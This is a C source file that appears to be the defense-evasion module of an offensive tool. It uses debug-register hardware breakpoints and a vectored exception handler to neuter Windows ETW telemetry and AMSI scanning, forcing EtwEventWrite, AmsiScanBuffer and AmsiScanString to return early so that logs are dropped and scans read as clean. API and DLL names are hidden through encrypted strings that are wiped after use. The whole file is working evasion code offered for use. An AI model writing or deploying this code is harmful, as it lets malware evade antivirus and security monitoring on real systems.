#include "hwbp_bypass.h"
#include "evs.h"
#include "evs_strings.h"
#include <stdint.h>

static LPVOID g_etw_fn       = NULL;   /* EtwEventWrite   -> Dr0 */
static LPVOID g_amsi_fn      = NULL;   /* AmsiScanBuffer  -> Dr1 */
static LPVOID g_amsi_scan_fn = NULL;   /* AmsiScanString  -> Dr2 */
static PVOID  g_veh          = NULL;

/*
 * VEH: on EXCEPTION_SINGLE_STEP at a watched address:
 *   EtwEventWrite  -> RAX=0             (STATUS_SUCCESS, telemetry silently dropped)
 *   AmsiScanBuffer -> RAX=0x80070057   (E_INVALIDARG, scan bypassed as "clean")
 *   AmsiScanString -> RAX=0x80070057
 *
 * Return address is popped from the stack so the caller resumes after the call site.
 * The corresponding Bx bit in Dr6 is cleared to re-arm the breakpoint.
 */
__attribute__((noinline))
static LONG WINAPI _hwbp_veh(EXCEPTION_POINTERS *ep)
{
    if (ep->ExceptionRecord->ExceptionCode != EXCEPTION_SINGLE_STEP)
        return EXCEPTION_CONTINUE_SEARCH;

    CONTEXT *ctx = ep->ContextRecord;
    BOOL handled = FALSE;

    if (g_etw_fn && (LPVOID)(uintptr_t)ctx->Rip == g_etw_fn) {
        ctx->Rax  = 0;
        ctx->Rip  = *(DWORD64 *)(uintptr_t)ctx->Rsp;
        ctx->Rsp += 8;
        ctx->Dr6 &= ~(DWORD64)0x1;
        handled   = TRUE;
    }

    if (g_amsi_fn && (LPVOID)(uintptr_t)ctx->Rip == g_amsi_fn) {
        ctx->Rax  = 0x80070057;
        ctx->Rip  = *(DWORD64 *)(uintptr_t)ctx->Rsp;
        ctx->Rsp += 8;
        ctx->Dr6 &= ~(DWORD64)0x2;
        handled   = TRUE;
    }

    if (g_amsi_scan_fn && (LPVOID)(uintptr_t)ctx->Rip == g_amsi_scan_fn) {
        ctx->Rax  = 0x80070057;
        ctx->Rip  = *(DWORD64 *)(uintptr_t)ctx->Rsp;
        ctx->Rsp += 8;
        ctx->Dr6 &= ~(DWORD64)0x4;
        handled   = TRUE;
    }

    return handled ? EXCEPTION_CONTINUE_EXECUTION : EXCEPTION_CONTINUE_SEARCH;
}

static void _ensure_veh(void)
{
    if (!g_veh)
        g_veh = AddVectoredExceptionHandler(1, _hwbp_veh);
}

/* Apply current Dr0/Dr1/Dr2/Dr7 state to a thread via GetThreadContext/SetThreadContext */
void hwbp_apply_thread(HANDLE hThread)
{
    if (!g_etw_fn && !g_amsi_fn && !g_amsi_scan_fn) return;

    CONTEXT ctx;
    ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
    if (!GetThreadContext(hThread, &ctx)) return;

    if (g_etw_fn)       ctx.Dr0 = (DWORD64)(uintptr_t)g_etw_fn;
    if (g_amsi_fn)      ctx.Dr1 = (DWORD64)(uintptr_t)g_amsi_fn;
    if (g_amsi_scan_fn) ctx.Dr2 = (DWORD64)(uintptr_t)g_amsi_scan_fn;

    /* Dr7: local enable bits 0,2,4 for Dr0,Dr1,Dr2 */
    ctx.Dr7 &= ~(DWORD64)0x0FFF0015;
    ctx.Dr7 |= g_etw_fn       ? 0x01 : 0;
    ctx.Dr7 |= g_amsi_fn      ? 0x04 : 0;
    ctx.Dr7 |= g_amsi_scan_fn ? 0x10 : 0;

    SetThreadContext(hThread, &ctx);
}

void hwbp_patch_etw(void)
{
    if (!g_etw_fn) {
        char ntdll[sizeof(EVS_dll_ntdll) + 1];
        EVS_D(ntdll, EVS_dll_ntdll);
        HMODULE h = GetModuleHandleA(ntdll);
        SecureZeroMemory(ntdll, sizeof(ntdll));

        if (h) {
            char fname[sizeof(EVS_fn_EtwEventWrite) + 1];
            EVS_D(fname, EVS_fn_EtwEventWrite);
            g_etw_fn = (LPVOID)GetProcAddress(h, fname);
            SecureZeroMemory(fname, sizeof(fname));
        }
    }
    _ensure_veh();
    hwbp_apply_thread(GetCurrentThread());
}

void hwbp_patch_amsi(void)
{
    if (!g_amsi_fn || !g_amsi_scan_fn) {
        char amsi[sizeof(EVS_dll_amsi) + 1];
        EVS_D(amsi, EVS_dll_amsi);
        HMODULE h = GetModuleHandleA(amsi);
        if (!h) h = LoadLibraryA(amsi);   /* amsi.dll may not be loaded yet */
        SecureZeroMemory(amsi, sizeof(amsi));

        if (h) {
            if (!g_amsi_fn) {
                char buf[sizeof(EVS_fn_AmsiScanBuffer) + 1];
                EVS_D(buf, EVS_fn_AmsiScanBuffer);
                g_amsi_fn = (LPVOID)GetProcAddress(h, buf);
                SecureZeroMemory(buf, sizeof(buf));
            }
            if (!g_amsi_scan_fn) {
                char buf[sizeof(EVS_fn_AmsiScanString) + 1];
                EVS_D(buf, EVS_fn_AmsiScanString);
                g_amsi_scan_fn = (LPVOID)GetProcAddress(h, buf);
                SecureZeroMemory(buf, sizeof(buf));
            }
        }
    }
    _ensure_veh();
    hwbp_apply_thread(GetCurrentThread());
}

void hwbp_patch_all(void)
{
    hwbp_patch_etw();
    hwbp_patch_amsi();
}
